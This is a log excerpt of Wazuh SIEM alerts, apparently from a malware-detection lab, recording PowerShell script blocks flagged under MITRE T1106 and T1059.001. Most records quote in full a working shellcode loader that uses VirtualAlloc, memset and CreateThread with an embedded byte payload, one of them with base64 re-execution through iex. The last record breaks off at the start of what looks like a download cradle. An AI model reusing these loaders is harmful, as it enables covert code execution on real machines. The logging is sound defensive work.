{"timestamp":"2026-07-06T02:21:30.036+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":183,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304490.3895019","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:50.2724360Z","eventRecordID":"145730","processID":"8180","threadID":"6900","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$OZL = '$LeLP = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $LeLP -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x5e,0x14,0xe4,0x9f,0xdb,0xd1,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x57,0x31,0x55,0x12,0x03,0x55,0x12,0x83,0x9b,0x10,0x06,0x6a,0xdf,0xf1,0x44,0x95,0x1f,0x02,0x29,0x1f,0xfa,0x33,0x69,0x7b,0x8f,0x64,0x59,0x0f,0xdd,0x88,0x12,0x5d,0xf5,0x1b,0x56,0x4a,0xfa,0xac,0xdd,0xac,0x35,0x2c,0x4d,0x8c,0x54,0xae,0x8c,0xc1,0xb6,0x8f,0x5e,0x14,0xb7,0xc8,0x83,0xd5,0xe5,0x81,0xc8,0x48,0x19,0xa5,0x85,0x50,0x92,0xf5,0x08,0xd1,0x47,0x4d,0x2a,0xf0,0xd6,0xc5,0x75,0xd2,0xd9,0x0a,0x0e,0x5b,0xc1,0x4f,0x2b,0x15,0x7a,0xbb,0xc7,0xa4,0xaa,0xf5,0x28,0x0a,0x93,0x39,0xdb,0x52,0xd4,0xfe,0x04,0x21,0x2c,0xfd,0xb9,0x32,0xeb,0x7f,0x66,0xb6,0xef,0xd8,0xed,0x60,0xcb,0xd9,0x22,0xf6,0x98,0xd6,0x8f,0x7c,0xc6,0xfa,0x0e,0x50,0x7d,0x06,0x9a,0x57,0x51,0x8e,0xd8,0x73,0x75,0xca,0xbb,0x1a,0x2c,0xb6,0x6a,0x22,0x2e,0x19,0xd2,0x86,0x25,0xb4,0x07,0xbb,0x64,0xd1,0xb9,0xa1,0xe2,0x21,0x2e,0x5d,0x63,0x4c,0xc7,0xf5,0x1b,0xdc,0x60,0xd0,0xdc,0x23,0x5b,0x2d,0x39,0x88,0x37,0x1d,0xee,0x7c,0xd0,0x9b,0x46,0xfa,0x87,0x23,0xb3,0xaf,0x94,0xb1,0x38,0x03,0x48,0x2e,0x4e,0xb4,0x6e,0xae,0x46,0x36,0x6e,0xae,0x96,0x68,0x29,0x9b,0xbb,0x1a,0xfd,0xe3,0x93,0x8a,0xaa,0x6a,0x8c,0x8d,0xaa,0xb8,0x3b,0xd7,0x06,0x2b,0x3b,0xea,0x48,0x2f,0x68,0x59,0xda,0x67,0xdd,0x0b,0xb4,0x6c,0xb4,0x9d,0x7f,0x8c,0xe3,0x74,0x15,0x78,0x54,0x11,0x6a,0x4f,0x6a,0xe1,0xe3,0x50,0x00,0xe5,0xa3,0xfa,0xcb,0xb3,0x2b,0x8e,0xb5,0xa5,0x2a,0x8f,0xec,0x89,0x61,0x23,0x5d,0x78,0xee,0xee,0x67,0x9c,0x95,0x0f,0xb2,0x19,0xa9,0x85,0x36,0x6d,0x5f,0xbf,0x2e,0x81,0x2a,0x9d,0xf8,0x9e,0x80,0x88,0x44,0x09,0x2b,0x5d,0x44,0xc9,0x43,0x5d,0x44,0x89,0x93,0x0e,0x2c,0x51,0x30,0xe3,0x49,0x9e,0xed,0x97,0xc2,0x32,0x87,0x7f,0xb3,0xdc,0x97,0x5f,0x3b,0x1d,0xcb,0xc9,0x53,0x0f,0x7d,0x7c,0x41,0xd0,0x54,0xfa,0x45,0x5b,0x9a,0x8e,0x42,0xa5,0xe7,0x14,0x8c,0xd0,0x02,0x4e,0xcf,0x44,0x25,0x1a,0x30,0x85,0x4a,0xd4,0xf7,0x48,0x9b,0x26,0x31,0x95,0xcd,0x78,0x13,0xd4,0x22,0x79;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$EKe=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($EKe.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$EKe,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($OZL));$Z7V = \"-e \";if([IntPtr]::Size -eq 8){$KjJF = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"& $KjJF $Z7V $e\"}else{;iex \"& powershell $Z7V $e\";}\r\n\r\nScriptBlock ID: 02986c85-6965-4339-ab1c-a7243212cb9b\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3652.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$OZL = '$LeLP = ''[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $LeLP -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x5e,0x14,0xe4,0x9f,0xdb,0xd1,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x57,0x31,0x55,0x12,0x03,0x55,0x12,0x83,0x9b,0x10,0x06,0x6a,0xdf,0xf1,0x44,0x95,0x1f,0x02,0x29,0x1f,0xfa,0x33,0x69,0x7b,0x8f,0x64,0x59,0x0f,0xdd,0x88,0x12,0x5d,0xf5,0x1b,0x56,0x4a,0xfa,0xac,0xdd,0xac,0x35,0x2c,0x4d,0x8c,0x54,0xae,0x8c,0xc1,0xb6,0x8f,0x5e,0x14,0xb7,0xc8,0x83,0xd5,0xe5,0x81,0xc8,0x48,0x19,0xa5,0x85,0x50,0x92,0xf5,0x08,0xd1,0x47,0x4d,0x2a,0xf0,0xd6,0xc5,0x75,0xd2,0xd9,0x0a,0x0e,0x5b,0xc1,0x4f,0x2b,0x15,0x7a,0xbb,0xc7,0xa4,0xaa,0xf5,0x28,0x0a,0x93,0x39,0xdb,0x52,0xd4,0xfe,0x04,0x21,0x2c,0xfd,0xb9,0x32,0xeb,0x7f,0x66,0xb6,0xef,0xd8,0xed,0x60,0xcb,0xd9,0x22,0xf6,0x98,0xd6,0x8f,0x7c,0xc6,0xfa,0x0e,0x50,0x7d,0x06,0x9a,0x57,0x51,0x8e,0xd8,0x73,0x75,0xca,0xbb,0x1a,0x2c,0xb6,0x6a,0x22,0x2e,0x19,0xd2,0x86,0x25,0xb4,0x07,0xbb,0x64,0xd1,0xb9,0xa1,0xe2,0x21,0x2e,0x5d,0x63,0x4c,0xc7,0xf5,0x1b,0xdc,0x60,0xd0,0xdc,0x23,0x5b,0x2d,0x39,0x88,0x37,0x1d,0xee,0x7c,0xd0,0x9b,0x46,0xfa,0x87,0x23,0xb3,0xaf,0x94,0xb1,0x38,0x03,0x48,0x2e,0x4e,0xb4,0x6e,0xae,0x46,0x36,0x6e,0xae,0x96,0x68,0x29,0x9b,0xbb,0x1a,0xfd,0xe3,0x93,0x8a,0xaa,0x6a,0x8c,0x8d,0xaa,0xb8,0x3b,0xd7,0x06,0x2b,0x3b,0xea,0x48,0x2f,0x68,0x59,0xda,0x67,0xdd,0x0b,0xb4,0x6c,0xb4,0x9d,0x7f,0x8c,0xe3,0x74,0x15,0x78,0x54,0x11,0x6a,0x4f,0x6a,0xe1,0xe3,0x50,0x00,0xe5,0xa3,0xfa,0xcb,0xb3,0x2b,0x8e,0xb5,0xa5,0x2a,0x8f,0xec,0x89,0x61,0x23,0x5d,0x78,0xee,0xee,0x67,0x9c,0x95,0x0f,0xb2,0x19,0xa9,0x85,0x36,0x6d,0x5f,0xbf,0x2e,0x81,0x2a,0x9d,0xf8,0x9e,0x80,0x88,0x44,0x09,0x2b,0x5d,0x44,0xc9,0x43,0x5d,0x44,0x89,0x93,0x0e,0x2c,0x51,0x30,0xe3,0x49,0x9e,0xed,0x97,0xc2,0x32,0x87,0x7f,0xb3,0xdc,0x97,0x5f,0x3b,0x1d,0xcb,0xc9,0x53,0x0f,0x7d,0x7c,0x41,0xd0,0x54,0xfa,0x45,0x5b,0x9a,0x8e,0x42,0xa5,0xe7,0x14,0x8c,0xd0,0x02,0x4e,0xcf,0x44,0x25,0x1a,0x30,0x85,0x4a,0xd4,0xf7,0x48,0x9b,0x26,0x31,0x95,0xcd,0x78,0x13,0xd4,0x22,0x79;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$EKe=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($EKe.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$EKe,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($OZL));$Z7V = \\\"-e \\\";if([IntPtr]::Size -eq 8){$KjJF = $env:SystemRoot + \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell\\\";iex \\\"&amp; $KjJF $Z7V $e\\\"}else{;iex \\\"&amp; powershell $Z7V $e\\\";}","scriptBlockId":"02986c85-6965-4339-ab1c-a7243212cb9b","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3652.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:32.049+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":184,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304492.3908768","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:51.9308423Z","eventRecordID":"145742","processID":"8644","threadID":"5092","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$jYnb = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $jYnb -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xcd,0xbe,0x21,0x2f,0xd0,0x68,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x4f,0x31,0x72,0x19,0x83,0xea,0xfc,0x03,0x72,0x15,0xc3,0xda,0x2c,0x80,0x81,0x25,0xcd,0x51,0xe5,0xac,0x28,0x60,0x25,0xca,0x39,0xd3,0x95,0x98,0x6c,0xd8,0x5e,0xcc,0x84,0x6b,0x12,0xd9,0xab,0xdc,0x98,0x3f,0x85,0xdd,0xb0,0x7c,0x84,0x5d,0xca,0x50,0x66,0x5f,0x05,0xa5,0x67,0x98,0x7b,0x44,0x35,0x71,0xf0,0xfb,0xaa,0xf6,0x4c,0xc0,0x41,0x44,0x41,0x40,0xb5,0x1d,0x60,0x61,0x68,0x15,0x3b,0xa1,0x8a,0xfa,0x30,0xe8,0x94,0x1f,0x7c,0xa2,0x2f,0xeb,0x0b,0x35,0xe6,0x25,0xf4,0x9a,0xc7,0x89,0x07,0xe2,0x00,0x2d,0xf7,0x91,0x78,0x4d,0x8a,0xa1,0xbe,0x2f,0x50,0x27,0x25,0x97,0x13,0x9f,0x81,0x29,0xf0,0x46,0x41,0x25,0xbd,0x0d,0x0d,0x2a,0x40,0xc1,0x25,0x56,0xc9,0xe4,0xe9,0xde,0x89,0xc2,0x2d,0xba,0x4a,0x6a,0x77,0x66,0x3d,0x93,0x67,0xc9,0xe2,0x31,0xe3,0xe4,0xf7,0x4b,0xae,0x60,0x34,0x66,0x51,0x71,0x52,0xf1,0x22,0x43,0xfd,0xa9,0xac,0xef,0x76,0x74,0x2a,0x0f,0xad,0xc0,0xa4,0xee,0x4d,0x31,0xec,0x34,0x19,0x61,0x86,0x9d,0x21,0xea,0x56,0x21,0xf4,0xbd,0x06,0x8d,0xa6,0x7d,0xf7,0x6d,0x16,0x16,0x1d,0x62,0x49,0x06,0x1e,0xa8,0xe2,0x2f,0xf7,0x53,0x0c,0xb0,0x91,0x20,0x63,0xc9,0x0d,0xa3,0x09,0x44,0xa6,0x44,0x9e,0xe2,0x18,0xff,0x04,0x65,0x16,0xd1,0xaa,0x1c,0xac,0x2d,0x5a,0x76,0x64,0x1a,0x1a,0x77,0xa0,0xe9,0x5a,0x94,0x21,0xeb,0x0a,0xcc,0xb7,0xf3,0xbb,0x50,0x31,0x15,0xd1,0x78,0x17,0x8d,0x4d,0xe0,0x32,0x45,0xec,0xed,0xe8,0x23,0x2e,0x65,0x1f,0xd3,0xe0,0x8e,0x6a,0xc7,0x94,0x7e,0x21,0xb5,0x32,0x80,0x9f,0xd0,0xba,0x14,0x24,0x73,0xed,0x80,0x26,0xa2,0xd9,0x0e,0xd8,0x81,0x52,0x86,0x4c,0x6a,0x0c,0xe7,0x80,0x6a,0xcc,0xb1,0xca,0x6a,0xa4,0x65,0xaf,0x38,0xd1,0x69,0x7a,0x2d,0x4a,0xfc,0x85,0x04,0x3f,0x57,0xee,0xaa,0x66,0x9f,0xb1,0x55,0x4d,0x21,0x8d,0x83,0xab,0x57,0xff,0x17;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Q3F=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Q3F.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Q3F,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: db41d67a-9e21-4673-be7b-71ee597ee117\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3667.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$jYnb = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $jYnb -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xcd,0xbe,0x21,0x2f,0xd0,0x68,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x4f,0x31,0x72,0x19,0x83,0xea,0xfc,0x03,0x72,0x15,0xc3,0xda,0x2c,0x80,0x81,0x25,0xcd,0x51,0xe5,0xac,0x28,0x60,0x25,0xca,0x39,0xd3,0x95,0x98,0x6c,0xd8,0x5e,0xcc,0x84,0x6b,0x12,0xd9,0xab,0xdc,0x98,0x3f,0x85,0xdd,0xb0,0x7c,0x84,0x5d,0xca,0x50,0x66,0x5f,0x05,0xa5,0x67,0x98,0x7b,0x44,0x35,0x71,0xf0,0xfb,0xaa,0xf6,0x4c,0xc0,0x41,0x44,0x41,0x40,0xb5,0x1d,0x60,0x61,0x68,0x15,0x3b,0xa1,0x8a,0xfa,0x30,0xe8,0x94,0x1f,0x7c,0xa2,0x2f,0xeb,0x0b,0x35,0xe6,0x25,0xf4,0x9a,0xc7,0x89,0x07,0xe2,0x00,0x2d,0xf7,0x91,0x78,0x4d,0x8a,0xa1,0xbe,0x2f,0x50,0x27,0x25,0x97,0x13,0x9f,0x81,0x29,0xf0,0x46,0x41,0x25,0xbd,0x0d,0x0d,0x2a,0x40,0xc1,0x25,0x56,0xc9,0xe4,0xe9,0xde,0x89,0xc2,0x2d,0xba,0x4a,0x6a,0x77,0x66,0x3d,0x93,0x67,0xc9,0xe2,0x31,0xe3,0xe4,0xf7,0x4b,0xae,0x60,0x34,0x66,0x51,0x71,0x52,0xf1,0x22,0x43,0xfd,0xa9,0xac,0xef,0x76,0x74,0x2a,0x0f,0xad,0xc0,0xa4,0xee,0x4d,0x31,0xec,0x34,0x19,0x61,0x86,0x9d,0x21,0xea,0x56,0x21,0xf4,0xbd,0x06,0x8d,0xa6,0x7d,0xf7,0x6d,0x16,0x16,0x1d,0x62,0x49,0x06,0x1e,0xa8,0xe2,0x2f,0xf7,0x53,0x0c,0xb0,0x91,0x20,0x63,0xc9,0x0d,0xa3,0x09,0x44,0xa6,0x44,0x9e,0xe2,0x18,0xff,0x04,0x65,0x16,0xd1,0xaa,0x1c,0xac,0x2d,0x5a,0x76,0x64,0x1a,0x1a,0x77,0xa0,0xe9,0x5a,0x94,0x21,0xeb,0x0a,0xcc,0xb7,0xf3,0xbb,0x50,0x31,0x15,0xd1,0x78,0x17,0x8d,0x4d,0xe0,0x32,0x45,0xec,0xed,0xe8,0x23,0x2e,0x65,0x1f,0xd3,0xe0,0x8e,0x6a,0xc7,0x94,0x7e,0x21,0xb5,0x32,0x80,0x9f,0xd0,0xba,0x14,0x24,0x73,0xed,0x80,0x26,0xa2,0xd9,0x0e,0xd8,0x81,0x52,0x86,0x4c,0x6a,0x0c,0xe7,0x80,0x6a,0xcc,0xb1,0xca,0x6a,0xa4,0x65,0xaf,0x38,0xd1,0x69,0x7a,0x2d,0x4a,0xfc,0x85,0x04,0x3f,0x57,0xee,0xaa,0x66,0x9f,0xb1,0x55,0x4d,0x21,0x8d,0x83,0xab,0x57,0xff,0x17;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Q3F=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Q3F.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Q3F,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"db41d67a-9e21-4673-be7b-71ee597ee117","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3667.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:33.033+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":185,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304493.3920785","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:52.7421895Z","eventRecordID":"145746","processID":"2304","threadID":"4140","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$Jged = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Jged -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x36,0x90,0x9c,0xd3,0xda,0xcd,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x31,0x55,0x13,0x83,0xed,0xfc,0x03,0x55,0x39,0x72,0x69,0x2f,0xad,0xf0,0x92,0xd0,0x2d,0x95,0x1b,0x35,0x1c,0x95,0x78,0x3d,0x0e,0x25,0x0a,0x13,0xa2,0xce,0x5e,0x80,0x31,0xa2,0x76,0xa7,0xf2,0x09,0xa1,0x86,0x03,0x21,0x91,0x89,0x87,0x38,0xc6,0x69,0xb6,0xf2,0x1b,0x6b,0xff,0xef,0xd6,0x39,0xa8,0x64,0x44,0xae,0xdd,0x31,0x55,0x45,0xad,0xd4,0xdd,0xba,0x65,0xd6,0xcc,0x6c,0xfe,0x81,0xce,0x8f,0xd3,0xb9,0x46,0x88,0x30,0x87,0x11,0x23,0x82,0x73,0xa0,0xe5,0xdb,0x7c,0x0f,0xc8,0xd4,0x8e,0x51,0x0c,0xd2,0x70,0x24,0x64,0x21,0x0c,0x3f,0xb3,0x58,0xca,0xca,0x20,0xfa,0x99,0x6d,0x8d,0xfb,0x4e,0xeb,0x46,0xf7,0x3b,0x7f,0x00,0x1b,0xbd,0xac,0x3a,0x27,0x36,0x53,0xed,0xae,0x0c,0x70,0x29,0xeb,0xd7,0x19,0x68,0x51,0xb9,0x26,0x6a,0x3a,0x66,0x83,0xe0,0xd6,0x73,0xbe,0xaa,0xbe,0xb0,0xf3,0x54,0x3e,0xdf,0x84,0x27,0x0c,0x40,0x3f,0xa0,0x3c,0x09,0x99,0x37,0x43,0x20,0x5d,0xa7,0xba,0xcb,0x9e,0xe1,0x78,0x9f,0xce,0x99,0xa9,0xa0,0x84,0x59,0x56,0x75,0x30,0x5f,0xc0,0x73,0x1e,0x95,0xb6,0x14,0xa2,0x2a,0xa7,0xb9,0x2b,0xcc,0x97,0x11,0x7c,0x41,0x57,0xc2,0x3c,0x31,0x3f,0x08,0xb3,0x6e,0x5f,0x33,0x19,0x07,0xf5,0xdc,0xf4,0x7f,0x61,0x44,0x5d,0x0b,0x10,0x89,0x4b,0x71,0x12,0x01,0x78,0x85,0xdc,0xe2,0xf5,0x95,0x88,0x02,0x40,0xc7,0x1e,0x1c,0x7e,0x62,0x9e,0x88,0x85,0x25,0xc9,0x24,0x84,0x10,0x3d,0xeb,0x77,0x77,0x36,0x22,0xe2,0x38,0x20,0x4b,0xe2,0xb8,0xb0,0x1d,0x68,0xb9,0xd8,0xf9,0xc8,0xea,0xfd,0x05,0xc5,0x9e,0xae,0x93,0xe6,0xf6,0x03,0x33,0x8f,0xf4,0x7a,0x73,0x10,0x06,0xa9,0x85,0x6c,0xd1,0x97,0xf3,0x9c,0xe1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$k4Al=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($k4Al.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$k4Al,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 3fb052dd-a167-4276-91b3-15b199ae86d8\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\368.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$Jged = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Jged -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x36,0x90,0x9c,0xd3,0xda,0xcd,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x31,0x55,0x13,0x83,0xed,0xfc,0x03,0x55,0x39,0x72,0x69,0x2f,0xad,0xf0,0x92,0xd0,0x2d,0x95,0x1b,0x35,0x1c,0x95,0x78,0x3d,0x0e,0x25,0x0a,0x13,0xa2,0xce,0x5e,0x80,0x31,0xa2,0x76,0xa7,0xf2,0x09,0xa1,0x86,0x03,0x21,0x91,0x89,0x87,0x38,0xc6,0x69,0xb6,0xf2,0x1b,0x6b,0xff,0xef,0xd6,0x39,0xa8,0x64,0x44,0xae,0xdd,0x31,0x55,0x45,0xad,0xd4,0xdd,0xba,0x65,0xd6,0xcc,0x6c,0xfe,0x81,0xce,0x8f,0xd3,0xb9,0x46,0x88,0x30,0x87,0x11,0x23,0x82,0x73,0xa0,0xe5,0xdb,0x7c,0x0f,0xc8,0xd4,0x8e,0x51,0x0c,0xd2,0x70,0x24,0x64,0x21,0x0c,0x3f,0xb3,0x58,0xca,0xca,0x20,0xfa,0x99,0x6d,0x8d,0xfb,0x4e,0xeb,0x46,0xf7,0x3b,0x7f,0x00,0x1b,0xbd,0xac,0x3a,0x27,0x36,0x53,0xed,0xae,0x0c,0x70,0x29,0xeb,0xd7,0x19,0x68,0x51,0xb9,0x26,0x6a,0x3a,0x66,0x83,0xe0,0xd6,0x73,0xbe,0xaa,0xbe,0xb0,0xf3,0x54,0x3e,0xdf,0x84,0x27,0x0c,0x40,0x3f,0xa0,0x3c,0x09,0x99,0x37,0x43,0x20,0x5d,0xa7,0xba,0xcb,0x9e,0xe1,0x78,0x9f,0xce,0x99,0xa9,0xa0,0x84,0x59,0x56,0x75,0x30,0x5f,0xc0,0x73,0x1e,0x95,0xb6,0x14,0xa2,0x2a,0xa7,0xb9,0x2b,0xcc,0x97,0x11,0x7c,0x41,0x57,0xc2,0x3c,0x31,0x3f,0x08,0xb3,0x6e,0x5f,0x33,0x19,0x07,0xf5,0xdc,0xf4,0x7f,0x61,0x44,0x5d,0x0b,0x10,0x89,0x4b,0x71,0x12,0x01,0x78,0x85,0xdc,0xe2,0xf5,0x95,0x88,0x02,0x40,0xc7,0x1e,0x1c,0x7e,0x62,0x9e,0x88,0x85,0x25,0xc9,0x24,0x84,0x10,0x3d,0xeb,0x77,0x77,0x36,0x22,0xe2,0x38,0x20,0x4b,0xe2,0xb8,0xb0,0x1d,0x68,0xb9,0xd8,0xf9,0xc8,0xea,0xfd,0x05,0xc5,0x9e,0xae,0x93,0xe6,0xf6,0x03,0x33,0x8f,0xf4,0x7a,0x73,0x10,0x06,0xa9,0x85,0x6c,0xd1,0x97,0xf3,0x9c,0xe1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$k4Al=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($k4Al.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$k4Al,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"3fb052dd-a167-4276-91b3-15b199ae86d8","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\368.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:34.438+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":21,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304494.3932150","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:54.2979849Z","eventRecordID":"145757","processID":"6312","threadID":"6116","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$wc=NeW-OBJeCt 